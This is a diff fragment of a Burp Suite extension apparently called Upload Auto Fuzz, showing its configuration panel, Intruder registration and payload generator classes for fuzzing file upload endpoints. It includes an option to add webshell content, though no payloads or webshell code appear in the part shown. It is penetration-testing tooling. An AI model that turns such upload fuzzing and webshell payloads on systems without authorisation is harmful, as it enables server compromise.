+        cb = self._strategy_checkboxes[strategy]
+        self.config.enable_strategy(strategy, cb.isSelected())
+        self._update_status()
+    
+    def _on_webshell_toggle(self):
+        """Handle webshell content toggle."""
+        self.config.include_webshell = self._webshell_cb.isSelected()
+        self._update_status()
+    
+    def _select_all_languages(self, select):
+        """Select or deselect all languages."""
+        for lang, cb in self._lang_checkboxes.items():
+            cb.setSelected(select)
+            if select:
+                if lang not in self.config.target_languages:
+                    self.config.target_languages.append(lang)
+            else:
+                if lang in self.config.target_languages:
+                    self.config.target_languages.remove(lang)
+        self._update_status()
+    
+    def _select_all_strategies(self, select):
+        """Enable or disable all strategies."""
+        for strategy, cb in self._strategy_checkboxes.items():
+            cb.setSelected(select)
+            self.config.enable_strategy(strategy, select)
+        self._update_status()
+    
+    def _update_status(self):
+        """Update the status display with current configuration."""
+        enabled_strategies = sum(1 for v in self.config.enabled_strategies.values() if v)
+        total_strategies = len(self.config.enabled_strategies)
+        
+        status_text = u"""Configuration Summary:
+  - Target Languages: {}
+  - Enabled Strategies: {}/{}
+  - WebShell Content: {}
+
+Ready to generate payloads. Select payload positions in Intruder and choose "{}".
+""".format(
+            ', '.join(self.config.target_languages) if self.config.target_languages else 'None (select at least one!)',
+            enabled_strategies,
+            total_strategies,
+            'Enabled' if self.config.include_webshell else 'Disabled',
+            EXTENSION_NAME
+        )
+        
+        self._status_area.setText(status_text)
+
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, ITab):
+    """
+    Main Burp Suite extension class.
+    
+    Implements:
+    - IBurpExtender: Extension entry point
+    - IIntruderPayloadGeneratorFactory: Intruder payload generation
+    - ITab: Configuration UI tab
+    """
+    
+    def registerExtenderCallbacks(self, callbacks):
+        """
+        Extension entry point called by Burp Suite.
+        
+        Args:
+            callbacks: IBurpExtenderCallbacks instance
+        """
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        
+        # Initialize logger
+        Logger.init(callbacks)
+        
+        # Reset and initialize configuration (ensure fresh state)
+        FuzzConfig.reset()
+        self._config = FuzzConfig()
+        
+        # Initialize payload factory
+        self._factory = PayloadFactory(self._config)
+        
+        # Set extension name
+        callbacks.setExtensionName(EXTENSION_NAME)
+        
+        # Register as Intruder payload generator
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        
+        # Create and register UI tab
+        self._panel = ConfigPanel(self._config)
+        callbacks.addSuiteTab(self)
+        
+        # Print banner
+        self._print_banner()
+    
+    def _print_banner(self):
+        """Print extension banner to output."""
+        banner = """
+================================================================================
+  Upload Auto Fuzz v{}
+================================================================================
+  A comprehensive file upload vulnerability testing tool
+  
+  Features:
+    - {} fuzzing strategies
+    - Configurable target languages: {}
+    - Intelligent payload deduplication
+    - Configurable payload limits
+  
+  Author: T3nk0
+  GitHub: https://github.com/T3nk0/Upload_Auto_Fuzz
+================================================================================
+""".format(
+            VERSION,
+            len(self._factory._strategies),
+            ', '.join(BACKEND_LANGUAGES.keys())
+        )
+        print(banner)
+    
+    # IIntruderPayloadGeneratorFactory implementation
+    
+    def getGeneratorName(self):
+        """
+        Return the name displayed in Intruder payload type dropdown.
+        
+        Returns:
+            Extension name string
+        """
+        return EXTENSION_NAME
+    
+    def createNewInstance(self, attack):
+        """
+        Create a new payload generator instance for an Intruder attack.
+        
+        Args:
+            attack: IIntruderAttack instance
+        
+        Returns:
+            IIntruderPayloadGenerator instance
+        """
+        return UploadFuzzer(self._factory, attack)
+    
+    # ITab implementation
+    
+    def getTabCaption(self):
+        """
+        Return the tab caption for the configuration panel.
+        
+        Returns:
+            Tab caption string
+        """
+        return "Upload Fuzz"
+    
+    def getUiComponent(self):
+        """
+        Return the UI component for the configuration tab.
+        
+        Returns:
+            JPanel instance
+        """
+        return self._panel
+
+
+class UploadFuzzer(IIntruderPayloadGenerator):
+    """
+    Intruder payload generator implementation.
+    
+    Generates payloads on-demand for Intruder attacks, using the
+    PayloadFactory for actual payload generation.
+    """
+    
+    def __init__(self, factory, attack):
+        """
+        Initialize the fuzzer.
+        
+        Args:
+            factory: PayloadFactory instance
+            attack: IIntruderAttack instance
+        """
+        self._factory = factory
+        self._attack = attack
+        self._payloads = None
+        self._index = 0
+        self._initialized = False
+    
+    def hasMorePayloads(self):
+        """
+        Check if more payloads are available.
+        
+        Returns:
+            True if more payloads available, False otherwise
+        """
+        if not self._initialized:
+            return True
+        return self._index < len(self._payloads)
+    
+    def getNextPayload(self, baseValue):
+        """
+        Get the next payload.
+        
+        Args:
+            baseValue: Byte array of the selected Intruder position
+        
+        Returns:
+            Next payload as string
+        """
+        # Initialize payloads on first call
+        if not self._initialized:
+            self._initialize_payloads(baseValue)
+        
+        # Return next payload
+        if self._index < len(self._payloads):
+            payload = self._payloads[self._index]
+            self._index += 1
+            return payload
+        
+        return ""
+    
+    def _initialize_payloads(self, baseValue):
+        """
+        Initialize payloads from the base value.
+        
+        Args:
+            baseValue: Byte array of selected content
+        """
+        try:
+            # Convert byte array to string
+            template = self._bytes_to_string(baseValue)
+            
+            # Validate template
+            if not self._validate_template(template):
+                Logger.error("Invalid template - missing required components")
+                self._payloads = [template]
+            else:
+                # Generate payloads
+                self._payloads = self._factory.generate_payloads(template)
+            
+            Logger.info("Initialized with {} payloads".format(len(self._payloads)))
+            
+        except Exception as e:
+            Logger.error("Failed to initialize payloads: {}".format(str(e)))
+            self._payloads = []
+        
+        self._initialized = True
+    
+    def _bytes_to_string(self, byte_array):
+        """
+        Convert Java byte array to Python string.
+        
+        Args:
+            byte_array: Java byte array
+        
+        Returns:
+            Python string
+        """
+        try:
+            # Handle both positive and negative byte values
+            return "".join(chr(b & 0xff) for b in byte_array)
+        except Exception as e:
+            Logger.error("Byte conversion failed: {}".format(str(e)))
+            return ""
+    
+    def _validate_template(self, template):
+        """
+        Validate that template contains required components.
+        
+        Args:
+            template: Template string
+        
+        Returns:
+            True if valid, False otherwise
+        """
+        # Must have filename
+        if 'filename=' not in template and 'filename"=' not in template:
+            return False
+        
+        # Should have Content-Disposition or Content-Type
+        if 'Content-Disposition' not in template and 'Content-Type' not in template:
+            return False
+        
+        return True
+    
+    def reset(self):
+        """Reset the generator to start from the beginning."""
+        self._index = 0
+        Logger.debug("Generator reset")
+
+
+# =============================================================================
+# Standalone Testing Support (Only runs when executed directly, not when imported)
+# =============================================================================
+
+def run_standalone_test():
+    """
+    Run standalone tests without Burp Suite.
+    
+    Useful for development and debugging.
+    This function is NOT called automatically when loaded as a Burp extension.
+    """
+    print("Running standalone test...")
+    
+    # Sample template
+    template = '''Content-Disposition: form-data; name="file"; filename="test.jpg"
+Content-Type: image/jpeg
+
+[binary content]'''
+    
+    # Create a fresh config instance (bypass singleton for testing)
+    FuzzConfig.reset()
+    config = FuzzConfig()
+    config.target_languages = ['php']  # Test with PHP only
+    config.max_payloads = 50  # Limit for testing
+    
+    factory = PayloadFactory(config)
+    
+    # Generate payloads
+    payloads = factory.generate_payloads(template)
+    
+    print("\nGenerated {} payloads:".format(len(payloads)))
+    for i, payload in enumerate(payloads[:10]):  # Show first 10
+        print("\n--- Payload {} ---".format(i + 1))
+        print(payload[:200] + "..." if len(payload) > 200 else payload)
+    
+    if len(payloads) > 10:
+        print("\n... and {} more payloads".format(len(payloads) - 10))
+    
+    # Reset singleton for potential Burp loading
+    FuzzConfig.reset()
+
+
+# Only run standalone test when executed directly (not when imported by Burp)
+# In Jython/Burp environment, __name__ is typically the module name, not "__main__"
+if __name__ == "__main__":
+    run_standalone_test()
